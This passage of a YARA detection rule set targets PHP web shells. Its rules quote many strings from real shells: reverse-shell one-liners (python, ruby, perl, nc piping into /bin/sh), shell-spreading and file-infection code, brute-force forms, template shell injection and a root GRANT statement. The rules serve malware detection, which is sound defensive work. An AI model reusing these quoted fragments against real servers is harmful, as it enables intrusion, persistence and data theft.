      $s9 = "elseif($s_sql['type']=='pgsql') $s_dump_tbl = \"SELECT * FROM \".$s_rows.\".\".$s_tables.\" LIMIT 100 OFFSET 0\";" fullword ascii
      $s10 = "$s_rsback[\"back_win\"] = \"Reverse Shell <span class='desc' style='font-size:12px;'>- windows executable</span>\";" fullword ascii
      $s11 = "if(trim($s_res)=='') $s_result = notif(\"Error getting process list\");" fullword ascii
      $s12 = "$s_pass = \"fb621f5060b9f65acf8eb4232e3024140dea2b34\"; // default password : b374k (login and change to new password)" fullword ascii
      $s13 = "setcookie(\"c[\".$k.\"]\", \"\" ,time() - $s_login_time);" fullword ascii
      $s14 = "if($s_sql['type']=='mysql') $s_dump_tbl = \"SELECT * FROM \".$s_rows.\".\".$s_tables.\" LIMIT 0,100\";" fullword ascii
      $s15 = "elseif(check_access(\"nodejs\")!==false) $s_result = exe($s_runlang.\"js \".$s_fpath.\" \".$s_rstarget);" fullword ascii
      $s16 = "='rshost_\".$s_rstype.\"' value='\".hss($s_rstarget).\"' /></td></tr>" fullword ascii
      $s17 = "// encryption for shell password" fullword ascii
      $s18 = "if(check_access(\"node\")!==false) $s_result = exe($s_runlang.\" \".$s_fpath.\" \".$s_rstarget);" fullword ascii
      $s19 = "r']).\"&sqlpass=\".pl($s_sql['pass']).\"&sqltype=\".pl($s_sql['type']).\"&sqlcode=\".pl($s_dump_tbl);" fullword ascii
      $s20 = "// give the code/command you want to execute in base64 format" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _12345_12bf2e21a1e712a85a4e80d60d80618da2694bd2_7
{
   meta:
      description = "php17 - from files 12345.php, 12bf2e21a1e712a85a4e80d60d80618da2694bd2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b901b76eeb426b480ea19504cbe09a9e252af5f8979777eac5bc29702387e985"
      hash2 = "4a8fe3d2e6298d18a61fc8d28f0dd210ff20a8a1f1c8e4ec5d80cf618e897ac0"
   strings:
      $s1 = "$myurl='http://www.zjjv.com';//" fullword ascii
      $s2 = "3Ve+sKNHLuFtP/zpe//hhf/5u78oz+WUKhZyE3elrl4bY70xuT" fullword ascii
      $s3 = "QaOkHSwetBfjpSHLfdrSwGrITkAl4NeAYWB5ANEYeQOMCsMK1Q" fullword ascii
      $s4 = "RvL60vXjRv6pjwLzGPfe/LbsOcvl3fbNi92bSxv5Ztg8dLl5Kd" fullword ascii
      $s5 = "OpqdXVfCBZfjRPdni1iYFZOX/xBHlogZFnrjYJyhpjWvrkoKnc" fullword ascii
      $s6 = "4FMGIYk6p4Vbyu9+wAfTPpb+dfaQ79Hvwe/g4aPaCO/oj4mLL5" fullword ascii
      $s7 = "wIui+t/gBcsvHkJCFZcEQxxlRSugfVjXA/hIzkRjFRLogykm2S" fullword ascii
      $s8 = "oMM5VHOcvAi+ndbMaMqmfGEtsEXIgT7lrzsB1w4jQFfUHzZ65A" fullword ascii
      $s9 = "4NCJOhINHlxJp8Md5iWwGZPCYDlgGBuUJN6bDNhnsADlLve8Iq" fullword ascii
      $s10 = "0A5kXzBtazYaHXtkUgEtigSd1KbR00grmOksD1vRTL2g8sw3d8" fullword ascii
      $s11 = "V8wjiGcpu0JkBzps8H80MZDk8U5lkLdsx9JghqWvdjusPyJAi6" fullword ascii
      $s12 = "bu2JKD2QLRAR9aHrN30RGaGTNih34JBlPDAfVnLlOGMXA3tpNU" fullword ascii
      $s13 = "kEyQQIaCKTh4GfBa17bQLDFdpkPLcTDT0NsxeKGThRnWpUkmCU" fullword ascii
      $s14 = "rFEOVkarrI8w8POkqzzMtMpu/0LXZS9EruVfJMFKqj+I7GmGsG" fullword ascii
      $s15 = "bbpc4BGEWQrRBgnk+FEauyH0b1nvnoF1b+tport2aIApeA4++U" fullword ascii
      $s16 = "4CsAJ+jcHSQq4Wg2kpbfC2kEyXjgyQai5TMmLIxcNPgno8oHBb" fullword ascii
      $s17 = "B0FbaFtmPmmgZ3s0NQE9OPmTxojoHgUMvoygzi4dEg3KTPdObA" fullword ascii
      $s18 = "ravd5p89RCOmDLWa/acU1OBrRcXXK9oliP/pUsON3cWVWOPNKD" fullword ascii
      $s19 = "ndRUNyt2jJZynKtQxKCd2umkg5Eoj5ct3jk/rbQx4mt+j5omVf" fullword ascii
      $s20 = "UTpPXiJniMW3nB8e7Kod7A3UgIon1SHWsKKK/MthNaiCoM1qW1" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _27f39fe03b8a845d353c707efc8e2766_4b14493c7c423b2a0dc04906f216fb96a8c6c90f_8
{
   meta:
      description = "php17 - from files 27f39fe03b8a845d353c707efc8e2766.php, 4b14493c7c423b2a0dc04906f216fb96a8c6c90f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "779752359badcd612a27b14adc73a179a406ba6927876ed1ff32e7c347d1bb60"
      hash2 = "03207c8670299d503957dda5b2a31912978c6dc9810548665a31fe6ef1cd56b8"
   strings:
      $x1 = "$c=search(\"perl\",$failflag).' '.$exec_path.' '.$_POST[\"ip\"].' '.$_POST[\"port\"].' && rm -f '.$exec_path.'';" fullword ascii
      $x2 = "$c=search(\"python\",$failflag).' '.$exec_path.' -r '.$_POST[\"port\"].' '.$_POST[\"ip\"].' && rm -f '.$exec_path.'';" fullword ascii
      $x3 = "echo \"first save and compile findsock binary, then connect to this shell via nc and specify the path to binary in the request, " ascii
      $x4 = "$c='python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"'.$_POST['ip']." fullword ascii
      $x5 = "$c='ruby -rsocket -e \\'exit if fork;c=TCPSocket.new(\"'.$_POST['ip'].'\",\"'.$_POST['port'].'\");while(cmd=c.gets);IO.popen(cm" fullword ascii
      $x6 = "$c=search(\"python\",$failflag).' '.$exec_path.' -b '.$_POST[\"port\"].' && rm -f '.$exec_path.'';" fullword ascii
      $x7 = "echo '<form method=\"post\" action=\"'.$_SERVER['PHP_SELF'].'\"><font color=\"gray\"> host: <input name=\"ssh2host\" type=\"text" ascii
      $x8 = "echo '<form method=\"post\" action=\"'.$_SERVER['PHP_SELF'].'\"> <font color=\"gray\">host: <input name=\"ssh2host\" type=\"text" ascii
      $x9 = "$c='perl -MIO -e \\'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"'.$_POST['ip'].':'.$_POST['port'].'\");STDIN->fdop" fullword ascii
      $x10 = "$c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && telnet '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd" fullword ascii
      $x11 = "$c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && nc '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd 2>&" fullword ascii
      $x12 = "$c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && nc '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd 2>&1';" fullword ascii
      $x13 = "you could get almost-interactive shell in bind/backconnect with help of these commands<br>" fullword ascii
      $x14 = "f you see \"TERM is not set\", run command: export TERM=linux<br>//thanks to ont.rif for interactive backconnect<br>';" fullword ascii
      $x15 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">'.$style.'</head><body><script type=\"text/javascript\">'" ascii
      $x16 = "// --------------------------------------------- shell end; file operations" fullword ascii
      $x17 = "pcntl_exec($_POST[\"inter\"],array(\"-c\",\"\".$_POST[\"command\"].\" \".$_POST[\"to\"].\" \".$_POST[\"pcfile\"]));" fullword ascii
      $x18 = "//determining if pcntl enabled is kinda tricky. debug: add if(dl('pcntl.so')) or check var_dump(get_extension_funcs('pcntl')) ?" fullword ascii
      $x19 = "//determining if pcntl enabled is kinda tricky. debug: add if(dl('pcntl.so')) or check var_dump(get_extension_funcs('pcntl'))" fullword ascii
      $x20 = "site! (it could result in error 500). <br>it is recommended to create new dir and place custom .htaccess and minishells there.<" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _069059b7ef840f0c74a814ec9237b6ec_6291c0df3b06048508a5764b9025f68105ccea92_9
{
   meta:
      description = "php17 - from files 069059b7ef840f0c74a814ec9237b6ec.php, 6291c0df3b06048508a5764b9025f68105ccea92.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cd73e2b32de14c58c3e27d833be05ec7fbfaf569ed10f18d47bf11352d6b4954"
      hash2 = "20e6f705f72db86e7171fb1b6df4b9c8f7b49b7d184c58c548617ec3dae86d93"
   strings:
      $x1 = "&nbsp;&nbsp;<b>Glftpd DupeScan Local Exploit <u>File 2</u></b> (binary file to run - <u>$private[3]</u> )</td></tr>" fullword ascii
      $x2 = "&nbsp;&nbsp;<b>Glftpd DupeScan Local Exploit <u>File 1</u></b> (binary file to run - <u>$private[2]</u> )</td></tr>" fullword ascii
      $x3 = "&nbsp;&nbsp;bindtty.c - remote shell on 4000 port, with rights of current user (id of apache)<br>" fullword ascii
      $x4 = "efault listening port is 31337 - connect to it with your favotite IRC client and set a password<br>" fullword ascii
      $x5 = "fputs($f,\"Decrypted MD5 hash [$pass_de] = $word\\nBruteforce start:\\t$dat - $date\\Bruteforce finish:\\" fullword ascii
      $x6 = "# echo \"<tr><td align=center bgcolor=#FFFFCC><b>&nbsp; \".exec(\"rm -f s\").\"</b> Removing file<u>s</u> now...</td></tr>\";" fullword ascii
      $x7 = "&nbsp;&nbsp;lGlftpd DupeScan Local Exploit - private local root exploits for Glftpd daemon <br>" fullword ascii
      $x8 = "else { open_file(\"dump_\".$dte.$tbl[$i].$fc.\".sql\".$gz);write_file($temp.\"\\n\\n\");close_file();$nbf=1; }" fullword ascii
      $x9 = "&nbsp;&nbsp;<b>FTP bruteforce</b>(full bruteforce, you are only to enter a value of number of passwords and brute will begin fr" fullword ascii
      $x10 = "<tr><td bgcolor=#FFFFCC><br><b>NetworkFileManagerPHP</b> - script to access your host in a best way</font><br><br>" fullword ascii
      $x11 = "&nbsp;&nbsp;localroot root linux 2.4.* - Exploit do_brk (code added) - gains local root priveleges if exploited succes<br>" fullword ascii
      $x12 = "<dd><b>Compilation, installing and running psybnc:</b> make // making psybnc // ./psybnc // You may edit psybnc.conf with NFM, D" ascii
      $x13 = "t=black bordercolordark=white><tr><td align=center>\".$g[1].\":\".$g[1].\" - <b>failed</b></td></tr></table>\";" fullword ascii
      $x14 = "global $action,$private_site, $title_exp,$login, $host, $file, $chislo, $proverka;" fullword ascii
      $x15 = "echo \"<tr><td align=center bgcolor=#FFFFCC><b>&nbsp; \".exec(\"./s\").\"</b> now running to 4000 port</td></tr>\";" fullword ascii
      $x16 = "<tr><td> <font color='#FFFFCC' face='Tahoma' size = 2>Directory <u><b>$fullpath</b></u>  \".exec(\"tar -zc $fullpath -f $pass.ta" ascii
      $x17 = "&nbsp;&nbsp;<b>psyBNC version:2.3.2-4</b> - psyBNC (binary file to run - <u>./psybnc</u>)</td></tr>" fullword ascii
      $s18 = "global $status,$form,$action,$name,$email,$pole,$REMOTE_ADDR,$HTTP_REFERER,$DOCUMENT_ROOT,$PATH_TRANSLATED,$HTTP_HOST;" fullword ascii
      $s19 = "<br><center><font color=red>You forgot to check tables, which you need to dump =)</b></font></center>\\n$footer\";" fullword ascii
      $s20 = "nothing to do it, so It's not a problem for you to bryte any ftp account now. But do not write very big value of passwords (100" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _322a0646befd0343c7752913562bdfdee0a6c25a_88d0d4696c9cb2d37d16e330e236cb37cfaec4cd_10
{
   meta:
      description = "php17 - from files 322a0646befd0343c7752913562bdfdee0a6c25a.php, 88d0d4696c9cb2d37d16e330e236cb37cfaec4cd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b8068c2aa02c4c3361a0caadbb86df262c1fe876a9543cfdf339f1a8dbb2ce8f"
      hash2 = "e85843849ddea1f90f1c0b3a54aa91d69a740bb5d06b7036315bc6529e96c43b"
   strings:
      $x1 = "if ($ka){print'Success <br> Shell Injected in '.$template;}" fullword ascii
      $s2 = "$p = \"UPDATE \".$_POST[tab].\"template SET template ='\".$a.$code.\"\\'))}}{\\${exit()}}&' WHERE title ='\".$template.\"'\";" fullword ascii
      $s3 = "$p = \"UPDATE \".$_POST[tab].\"template SET template ='\".$a.$tkl_index.\"\\'))}}' WHERE title ='\".$lost.\"'\";" fullword ascii
      $s4 = "MlYwUFNKZllteGhibXNpUGx0SFlYcGhJRWhoUTB0bFVpQlVaV0Z0WFR3dllUNGdMU0E4WVNCb2NtVm1QU0pvZEhSd09pOHZaMkY2WVMxb1lXTnJaWEl1Ym1WMEwyTmpM" ascii
      $s5 = "echo '[ <a href=\"' . $self . '?tool=Files&dir=' . urlencode($real_file) . '\">' . html($file['target']) . '</a> ]';" fullword ascii
      $s6 = "Inject To :<br><select size=\"1\" name=\"template\">" fullword ascii
      $s7 = "<form name=\"frm\" action=\"\" method=\"POST\" onsubmit=\"document.frm.code.value = encode64(document.frm.code.value)\">" fullword ascii
      $s8 = "<form name=\"frm\" action=\"\" method=\"POST\" onsubmit=\"document.frm.code.value = vb(document.frm.code.value)\">" fullword ascii
      $s9 = "YWx1ZT0iY2hhbmdlLXBocEJCLUFkbWluIiBuYW1lPSJzZW5kIiB0eXBlPSJzdWJtaXQiPiA8L0ZPUk0+JzsgfSBpZiAoJF9QT1NUWydzZW5kJ10gPT0gJ2NoYW5nZS1w" ascii
      $s10 = "#                    Coded By TKL                                 #" fullword ascii
      $s11 = "PSJlbWFpbCIgc2l6ZT0iMTUiIHZhbHVlPSJlbWFpbEBzaXRlLmNvbSI+PGJyPiA8SU5QVVQgdmFsdWU9ImNoYW5nZS1qb29tbGEtYWRtaW4iIG5hbWU9InNlbmQiIHR5" ascii
      $s12 = "cGJuUlFZV2RsU0dWaFpHVnlLQ0ptSWlrN0RRb0pDWEJ5YVc1MElDSkdZV2xzWldRZ2RHOGdaRzkzYm14dllXUWdKRVpwYkdWVmNtdzZJQ1FoSWpzTkNna0pKbEJ5YVc1" ascii
      $s13 = "eklIUm9aU0IxY0d4dllXUWdjSEp2WTJWemN5NE5DaU10TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMw" ascii
      $s14 = "PSJjaGFuZ2UtdmItYWRtaW4iIG5hbWU9InNlbmQiIHR5cGU9InN1Ym1pdCI+IDwvRk9STT4nOyB9IGlmICgkX1BPU1RbJ3NlbmQnXSA9PSAnY2hhbmdlLXZiLWFkbWlu" ascii
      $s15 = "cGU9InN1Ym1pdCI+IDwvRk9STT4nOyB9IGlmICgkX1BPU1RbJ3NlbmQnXSA9PSAnY2hhbmdlLWpvb21sYS1hZG1pbicpeyAkbG9jYWxob3N0ID0gJF9QT1NUWydsb2Nh" ascii
      $s16 = "ImVtYWlsIiBzaXplPSIxNSIgdmFsdWU9ImVtYWlsQHNpdGUuY29tIj48YnI+IDxJTlBVVCB2YWx1ZT0iY2hhbmdlLXplbmNhcnQtYWRtaW4iIG5hbWU9InNlbmQiIHR5" ascii
      $s17 = "b3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFIHVzZXIgU0VUIHBhc3N3b3JkID0nMzA0MjE3Nzg5MGMyZTc5NzczZTBlZDhlOGVm" ascii
      $s18 = "$gaza_mysql_file = $_POST['gaza_mysql_file']; // e.g : /etc/passwd" fullword ascii
      $s19 = "<option value=\"Inject\">Shell Inject</option>" fullword ascii
      $s20 = "echo  stream_get_contents($stream, -1, 10);" fullword ascii
   condition:
      ( ( uint16(0) == 0x3c0a or uint16(0) == 0x3f3c ) and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _351df1bd824721442e4e709e3806a9fc139de3e6_a14f987baeff8875419578f234d3f7bd176ecae9_a3a45774024ad0f93c71041f4baf72ad6ca34522__11
{
   meta:
      description = "php17 - from files 351df1bd824721442e4e709e3806a9fc139de3e6.php, a14f987baeff8875419578f234d3f7bd176ecae9.php, a3a45774024ad0f93c71041f4baf72ad6ca34522.php, a3b57f52c3782c20a2c006533c8f5d815034aefc.php, ae47d0c555af72c76439a56cf4a97da86eb97412.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c9e0c70dddb705dddf0a5f54c517a380f8f914b6d0b4149ac8524c5df586a274"
      hash2 = "a7b068946ecd1e014c436f359287852193d56e75803f2cb949be6d13186bbb38"
      hash3 = "6d8435d732262dd06b1022983eb90db9bba800e4f25984e616ee143d26561621"
      hash4 = "c53b0ccd965a4c11601fccd308ef7ba02c784e7984984682313cca6acf67f6d4"
      hash5 = "faefad57447fce349f5bf2b7f253ed96883313d875d7f418b8730f8dc8f38e3f"
   strings:
      $x1 = "John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>\";" fullword ascii
      $x2 = "$serv = @mysql_connect($adress.\":\".$port, $login,$pass) or die(\"<font color=red>Error: \".mysql_error().\"</font>\");" fullword ascii
      $x3 = "# example: Delete autoexec.bat (nst) del c:\\autoexec.bat" fullword ascii
      $x4 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl" ascii
      $x5 = "<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&vnutr=1&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x6 = "</form><form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x7 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tb" fullword ascii
      $x8 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $x9 = "Read file content using MySQL - when <b>safe_mode</b>, <b>open_basedir</b> is <font color=green>ON</font><Br>" fullword ascii
      $s10 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");" fullword ascii
      $s11 = "# Dump from: \".$_SERVER[\"SERVER_NAME\"].\" (\".$_SERVER[\"SERVER_ADDR\"].\")" fullword ascii
      $s12 = "<font color=green><b>You can change temp folder for dump file in your browser!<br>" fullword ascii
      $s13 = "1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]&ins_new_line=1'>$str[0]</a><br>\";" fullword ascii
      $s14 = "header(\"Content-disposition: attachment; filename=\\\"$download\\\";\");" fullword ascii
      $s15 = "<font color=red>Change variable &f_d=(here writable directory, expl: /tmp or c:/windows/temp)</font><br>" fullword ascii
      $s16 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii
      $s17 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $s18 = "1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a><br>\";" fullword ascii
      $s19 = "if($_GET['dump_download']){" fullword ascii
      $s20 = "<tr><td>Login:</td><td><input name=l value=\".$_POST['l'].\"></td></tr>" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x4947 ) and filesize < 200KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _49e5bc75a1ec36beeff4fbaeb16b322b08cf192d_935f41a04ef2759e77a99bf5f1f9df90502f14bc_12
{
   meta:
      description = "php17 - from files 49e5bc75a1ec36beeff4fbaeb16b322b08cf192d.php, 935f41a04ef2759e77a99bf5f1f9df90502f14bc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7fcd99de6173e2e73117de3c20ea86e1574bf3ff971f216549d981db7a8ab428"
      hash2 = "ab59333bcb83ea7c33850b1d02fa7ffc1e6260a4f73adc6082a6502326ddd7c5"
   strings:
      $x1 = "if(preg_match(\"/^http:\\/\\/+/\",$_POST['remote_login_target'])) die(\"Do not include http:// in the target URL.\");" fullword ascii
      $x2 = "<tr><td>Login form: <input type='text' value='' name='remote_login_target'></br>Username: <input type='text' value='admin' n" fullword ascii
      $x3 = "<tr><td colspan='2'><form action='$self?act=bypass' method='post' name='bypasser'>[Existing] Database to store temporary tab" fullword ascii
      $x4 = "$dump_file.=\"######################Dumped by: MulciShell v0.2 - Edited By KingDefacer#####################\\n\";" fullword ascii
      $x5 = "$dump_file.=\"######################Dumped by: MulciShell v0.2 - Edited By KingDefacer#####################\\n\\n\";" fullword ascii
      $x6 = "<tr><td><form action='$self?act=bypass' method='post' name='bypasser'>Read file: <input type='text' value='/etc/passwd' name" fullword ascii
      $x7 = "<tr><td><form action='$self?act=bypass' method='post' name='bypasser'>Copy to: <input type='text' style='width: 250px;' name" fullword ascii
      $x8 = "\"Bypassers\"=>\"$self?act=bypass\",\"Tools\"=>\"$self?act=tools\",\"Databases\"=>\"$self?act=dbs\",\"Backdoor Host\"=>\"$self?a" ascii
      $x9 = "echo \"<center>Do you *really* want to kill the shell?<br><br><form action='$self?act=kill' method='post'>" fullword ascii
      $x10 = "echo \"Successfully infected $success files; failed to infect $fail files</br>Exploit files as such: file.php?e=php code\";" fullword ascii
      $x11 = "echo \"Successfully infected $success files; failed to infect $fail files</br>Exploit files as such: file.php?e=php code\"" fullword ascii
      $x12 = "$path=explode('/',$_POST['remote_login_target']);" fullword ascii
      $x13 = "This tool will attempt to copy the shell into every writable directory on the server, in order to allow access maintaini" fullword ascii
      $x14 = "$header=\"GET /search/reverse-ip-domain.php?q=$_SERVER[HTTP_HOST] HTTP/1.0\\r\\n\";" fullword ascii
      $x15 = "execmd(\"perl \".getcwd().\"/bc.pl $_POST[backconnip] $_POST[backconnport]\",$disable);" fullword ascii
      $x16 = "<tr><td>Remote login Brute Force</td><td>HTTP-Auth Brute Force</td></tr>" fullword ascii
      $x17 = "if(preg_match(\"/^http:\\/\\/+/\",$_POST['auth_url'])) die(\"Do not include http:// in the url\");" fullword ascii
      $x18 = "echo ($s>0)?\"Spread complete. Successfully managed to spread the shell $s times</br>\":\"Failed to spread the shell.</br>\";" fullword ascii
      $x19 = "echo ($s>0)?\"Spread complete. Successfully managed to spread the shell $s times</br>\":\"Failed to spread the shell.</br>\"" fullword ascii
      $x20 = "$ch=curl_init($_POST['remote_login_target']);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _1__4__140748a2a279ced57c797f726dcb7ad9a65005e2_3c7b93811ffd056b5952b80a517c10c2_5bdae9780fa349f3b58c475985c13c012897bd61_64_13
{
   meta:
      description = "php17 - from files 1 (4).php, 140748a2a279ced57c797f726dcb7ad9a65005e2.php, 3c7b93811ffd056b5952b80a517c10c2.php, 5bdae9780fa349f3b58c475985c13c012897bd61.php, 6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87.php, 7e594b9fa652d185c4b87ab7080f740f5d7eea2f.php, 9735037eae2f73171d007caca31fbfb6467850d5.php, a7b3b8a66367f3e61183f78bbb82556eb2c2e40b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "052f0f91060fa3f6723bfe2c0cc469246b58af699cda72e2b57d2918b8d1f1e9"
      hash2 = "c929f266350e6b936ad98409beb09d99a46c174440b2cc294b1b6440b5dea350"
      hash3 = "ea918b9d0452f99243cd726116e120d79a68c881cca87d1e467e72c646eff74a"
      hash4 = "af896e0ad20db413c0cc3b5a8cda278400c143b470de54f8ccdf6154592279fd"
      hash5 = "4713738198d1baac37ab2fb1b8906bc8c5e4f4eb064808a051ef89e003ed3f86"
      hash6 = "2e605821bf44cdf64b605ee38090f2e3d9807df8d30e8c1c2640a8f5b4471528"
      hash7 = "0a18abae4ed20eb3140925b78cce995a272b596f97191b1fb08024942ee7c854"
      hash8 = "6100c932ea14b9264bcf16b46893716650bf412b6c4ecd538b37e3205f7a2dcc"
   strings:
      $s1 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
      $s2 = "Str[3] = \"GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;\";" fullword ascii
      $s3 = "$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $msql = 'select version();';" fullword ascii
      $s4 = "if(@mysql_connect($_POST['mhost'].':'.$_POST['mport'],$_POST['muser'],$_POST['mpass']))" fullword ascii
      $s5 = "a>\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";" fullword ascii
      $s6 = "$query = 'SELECT cmd FROM a INTO DUMPFILE \\''.$uppath.'\\';';" fullword ascii
      $s7 = "4C0075726C6D6F6E2E646C6C005753325F33322E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C5072" ascii
      $s8 = "$query = $query.substr($queryb, 0, -1).' '.base64_decode($_POST['wherevar']).';';" fullword ascii
      $s9 = "if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) @mysql_select_db($mdata);" fullword ascii
      $s10 = "if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? '" fullword ascii
      $s11 = "8047C28BB92975043BD384F296360A9523F4D797371909620A953A636306EC263B50B355A6A09A663B7B921E76A3752C077035C321703ABCF91FB2E746D7" ascii
      $s12 = "array(\"FTP\",Info_Fun(\"ftp_login\"))," fullword ascii
      $s13 = "$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['del'].', 1;',$conn);" fullword ascii
      $s14 = "$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['edit'].', 1;',$conn);" fullword ascii
      $s15 = "if(isset($_GET['table'])){$action .= '&table='.$_GET['table'];if(isset($_GET['edit'])) $action .= '&edit='.$_GET['edit'];}" fullword ascii
      $s16 = "55524C446F776E6C6F6164546F46696C6541" ascii
      $s17 = "if(isset($_POST['mhost']) && isset($_POST['muser']))" fullword ascii
      $s18 = "6D7973716C446C6C2E646C6C" ascii
      $s19 = "73746174655F6465696E6974" ascii
      $s20 = "$row_num = mysql_num_rows(mysql_query('SELECT * FROM '.$_GET['table'],$conn));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86_649515a5730e7baa0303b29ce49f7e142b88c2ce__14
{
   meta:
      description = "php17 - from files 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 91241fc05105627c2f58942867db10b2b691574e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash2 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash3 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash4 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
   strings:
      $x1 = "if(!@function_exists('escapeshellarg')){$res=$api->WinExec(\"cmd.exe /c $cfe >\\\"$output\\\"\",0);}" fullword ascii
      $x2 = "if(!@function_exists('escapeshellarg')){$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.$cfe.' > \"'.$output.'\"');}" fullword ascii
      $x3 = "else{$res=$api->WinExec(\"cmd.exe /c \".@escapeshellarg($cfe).\" >\\\"$output\\\"\",0);}" fullword ascii
      $x4 = "else{$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"');}" fullword ascii
      $x5 = "echo sr(15,\"<b>\".$lang[$language.'_text73'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x6 = "echo sr(15,\"<b>\".$lang[$language.'_text53'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x7 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x8 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x9 = "else{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"" ascii
